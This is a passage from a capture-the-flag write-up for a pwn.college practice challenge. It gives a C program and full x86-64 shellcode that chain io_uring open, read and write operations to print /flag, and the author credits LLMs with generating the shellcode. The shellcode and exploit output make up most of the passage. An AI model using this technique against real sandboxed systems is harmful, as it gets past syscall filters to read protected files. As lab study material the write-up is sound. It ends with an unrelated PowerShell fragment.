#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stddef.h>

int main() {
    int ring_fd;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;

    uint32_t *sq_tail;
    uint32_t *cq_head;

    uint8_t rings_stack[4096] __attribute__((aligned(4096)));
    uint8_t sqes_stack[4096] __attribute__((aligned(4096)));

    memset(rings_stack, 0, 4096);
    memset(sqes_stack, 0, 4096);

    struct io_uring_params p = {0};
    char *p_ptr = (char *)&p;

    *((uint32_t*)(p_ptr + 0x0)) = 8;
    *((uint32_t*)(p_ptr + 0x4)) = 8;
    *((uint32_t*)(p_ptr + 0x8)) = 0x14000;
    *((uint64_t*)(p_ptr + 0x70)) = (uint64_t)rings_stack;
    *((uint64_t*)(p_ptr + 0x48)) = (uint64_t)sqes_stack;

    ring_fd = syscall(__NR_io_uring_setup, 8, &p);

    sqes = (struct io_uring_sqe *)sqes_stack;
    sq_tail = (uint32_t *)((char *)rings_stack + 4);            // p.sq_off.tail
    cqes = (struct io_uring_cqe *)((char *)rings_stack + 64);   // p.cq_off.cqes
    cq_head = (uint32_t *)((char *)rings_stack + 8);            // p.cq_off.head

    char path[] = "/flag";
    char buf[4096];

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    char *sqe_ptr = (char *)&sqe;

    *((__u8 *)(sqe_ptr + 0)) = 18;                              // IORING_OP_OPENAT
    *((__s32 *)(sqe_ptr + 4)) = -100;                           // AT_FDCWD
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)path;
    *((__u32 *)(sqe_ptr + 28)) = 0;                             // O_RDONLY;

    memcpy(&sqes[0], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    int fd = cqes[0].res;
    printf("fd: %d\n", fd);

    memset(&sqe, 0, sizeof(sqe));
    *((__u8 *)(sqe_ptr + 0)) = 22;                              //IORING_OP_READ;
    *((__s32 *)(sqe_ptr + 4)) = fd;
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
    *((unsigned long *)(sqe_ptr + 24)) = sizeof(buf);

    memcpy(&sqes[1], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    int r = cqes[1].res;
    printf("read: %d\n", r);

    memset(&sqe, 0, sizeof(sqe));
    *((__u8 *)(sqe_ptr + 0)) = 23;                              // IORING_OP_WRITE;
    *((__s32 *)(sqe_ptr + 4)) = 1;
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
    *((unsigned long *)(sqe_ptr + 24)) = r;

    memcpy(&sqes[2], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    return 0;
}
```

Which, although maybe not production-grade, gets the flag:
```bash
ubuntu@practice~2025~day-05:~$ gcc io_uring_min.c -o io_uring
ubuntu@practice~2025~day-05:~$ sudo ./io_uring
fd: 4
read: 22
pwn.college{practice}
```

From this it was straight-forward. I fed this to a couple of LLMs and quickly got a working shellcode, with comments for easier torubleshooting:

```nasm
/* Get PC for PIC base */
call get_pc
get_pc:
pop rbp                     /* rbp holds the base address */

/* 1. Allocate and ALIGN RSP to a 4096-byte (0x1000) boundary. */
sub rsp, 0x2000
mov r13, rsp
mov r12, 0xfffffffffffff000 /* 4096-byte alignment mask */
and r13, r12                /* r13 is now aligned RSP address (rings_stack) */
mov rsp, r13                /* Set aligned address as the new RSP */

mov r12, rsp                /* r12 = rings_stack (CQ ring & internal data base) */
mov r13, rsp                /* r13 = sqes_stack (SQE array base) */
add r13, 0x1000    

mov r15, r13                /* r15 = address of buf (r13 + 0x100, scratch space) */
add r15, 0x100              /* Go past sqes[0..3] */

/* ZERO RING BUFFERS (4096 + 4096 = 8192 bytes total) */
mov rdi, r12                /* Start at rings_stack (r12) */
mov rcx, 0x2000             /* Length = 8192 bytes */
xor rax, rax
rep stosb                   /* Clear rings_stack and sqes_stack */

/* Reset r15 to point to the scratch buffer after clearing */
mov r15, r13
add r15, 0x100 

/* Setup path "/flag" into the stack buffer at r15 */
mov rax, 0x00550067616c662f
mov qword ptr [r15], rax
mov r14, r15                /* r14 = address of "/flag" for OPENAT */

/* 2. Setup io_uring_params p on the stack (below rings_stack) */
mov rdi, r12
sub rdi, 0x100              /* rdi = address of p */
mov rcx, 0x80
xor rax, rax
rep stosb                   /* memset(p, 0, 128) */
mov rsi, rdi                /* rsi = &p */

/* Set p.sq_entries = 8 (offset 0x0)  */
mov dword ptr [rsi], 0x8                         
/* Set p.cq_entries = 8 (offset 0x4)  */
mov dword ptr [rsi+4], 0x8
/* Set p.flags = 0x14000 (offset 0x8) */
mov dword ptr [rsi+8], 0x14000                         

/* Set p.sq_off.user_addr = sqes_stack (r13) (OFFSET: 0x48)  */
mov qword ptr [rsi+0x48], r13
/* Set p.cq_off.user_addr = rings_stack (r12) (OFFSET: 0x70) */
mov qword ptr [rsi+0x70], r12

/* 3. io_uring_setup(8, &p) */
mov rax, 425                /* __NR_io_uring_setup  */
mov rdi, 8                  /* sq_entries           */
syscall                     /* rsi = &p             */
mov ebx, eax                /* ebx = ring_fd        */

/* 4. OPENAT - Prepare sqe 0 */
mov rcx, r13                /* rcx = sqes (sqes_stack) */
mov rdi, rcx                /* rdi = address of sqes[0] */

/* sqe.opcode = 18, sqe.fd = -100, sqe.addr = r14 */
mov byte ptr [rdi], 18
mov dword ptr [rdi+4], 0xffffff9c
mov qword ptr [rdi+0x10], r14

/* open_flags (O_RDONLY = 0) at offset 0x1c (28) */
mov dword ptr [rdi+0x1c], 0          

/* Update sq_tail */
mov r8, r12                 /* r8 = rings_stack (Mapped Ring Base) */
add r8, 0x4                 /* sq_off.tail offset (4) */
inc dword ptr [r8]

/* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit OPENAT */
mov rax, 426                /* __NR_io_uring_enter */
mov rdi, rbx                /* ring_fd */
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0 
mov r9, 0 
syscall

/* Get fd from cqe[0].res */
mov rdx, r12
add rdx, 0x40                   /* rdx = CQE array base */
mov esi, dword ptr [rdx + 0x8]  /* esi = fd = cqe[0].res (offset 0x8) */

/* Update cq_head after OPENAT retrieval */
mov r8, r12
add r8, 0x8
inc dword ptr [r8]

/* READ - Prepare sqe 1 */
mov rdi, r13
add rdi, 0x40                   /* rdi = address of sqes[1] */

mov byte ptr [rdi], 22          /* sqe.opcode = 22 (IORING_OP_READ) */
mov dword ptr [rdi+4], esi      /* sqe.fd = esi (opened file descriptor) */
mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
mov qword ptr [rdi+0x18], 100   /* sqe.len = 100 */

/* Update sq_tail for the second submission */
mov r8, r12
add r8, 0x4
inc dword ptr [r8]

/* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit READ */
mov rax, 426
mov rdi, rbx
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0
mov r9, 0
syscall

/* Get bytes read (r) from cqe[1].res */
mov r8, r12
add r8, 0x40                        /* r8 = CQE array base */
add r8, 0x10                        /* r8 points to start of cqe[1] */
mov r10d, dword ptr [r8 + 0x8]      /* r10d = bytes read (cqes[1].res) */

/* Update cq_head after successful retrieval */
mov r9, r12
add r9, 0x8                         /* r9 = cq_head address */
inc dword ptr [r9]

/* WRITE - Prepare sqe 2 */
mov rdi, r13
add rdi, 0x80                       /* rdi = address of sqes[2] */

mov byte ptr [rdi], 23              /* sqe.opcode = 23 (IORING_OP_WRITE) */
mov dword ptr [rdi+4], 1        /* sqe.fd = 1 (stdout) */
mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
mov dword ptr [rdi+0x18], r10d  /* sqe.len = r10d (bytes read) */

/* Update sq_tail for the third submission */
mov r8, r12
add r8, 0x4
inc dword ptr [r8]

/* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit WRITE */
mov rax, 426
mov rdi, rbx
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0
mov r9, 0
syscall

/* Final cq_head update for WRITE result */
mov r9, r12
add r9, 0x8
inc dword ptr [r9]

/* Exit cleanly */
xor edi, edi
mov rax, 60
syscall
```

I used a wrapper python script to feed the shellcode to a pipe, to debug the challenge easier in GDB. Whew! Let's get the flag:
```bash
$ /challenge/sleigh < ~/my_fifo_stdin
🛷 Loading cargo: please stow your sled at the front.
📜 Checking Santa's naughty list... twice!
pwn.college{practice}

$ python sleigh.py
Press ENTER to send shellcode payload to fifo...
```

## Day 6 - 

<div class="box-note">
Note that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-6" target="_blank">Out-String -Stream</a> is very important here. This is needed to be able to use <b>Select-String</b> and grep through the output!
</div>

All the levels were very educative! Huge thanks to the authors.
